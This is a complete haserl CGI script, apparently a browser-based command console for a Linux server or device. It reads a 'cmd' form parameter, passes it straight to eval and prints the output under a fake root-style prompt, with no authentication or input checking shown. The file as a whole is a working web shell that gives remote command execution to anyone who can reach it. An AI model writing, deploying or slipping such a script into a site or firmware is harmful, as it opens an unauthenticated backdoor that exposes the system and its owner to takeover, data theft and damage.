#!/usr/bin/haserl
content-type: text/plain

<%
cd /tmp
_c="$FORM_cmd"
export PATH=/usr/local/bin:/usr/local/sbin:/bin:/sbin:/usr/bin:/usr/sbin
echo -e "<b>[$(whoami)@$(hostname) $PWD]# $_c</b>\n"
[ -n "$_c" -a "$_c" != "undefined" ] && _o=$(eval $_c 2>&1)
[ -z "$_o" ] && echo "- empty -" || echo "$_o"
%>
